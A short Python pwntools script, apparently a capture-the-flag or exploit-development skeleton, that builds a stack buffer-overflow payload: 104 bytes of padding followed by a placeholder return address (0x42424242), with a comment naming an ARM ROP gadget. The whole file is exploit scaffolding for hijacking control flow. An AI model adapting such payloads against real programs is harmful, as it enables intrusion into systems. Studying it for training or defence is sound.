from pwn import *
import sys

p=lambda x: p32(x)

offset=104

gadget_1=0x42424242 # x0001054e (0x0001054f): pop.w {r2, r4, r5, ip}; movs r2, r0; lsls r0, r1, #0x17; movs r1, r0; blx lr;
payload=""
payload+="A"*offset
payload+=p32(gadget_1)

sys.stdout.write(payload+"\n")
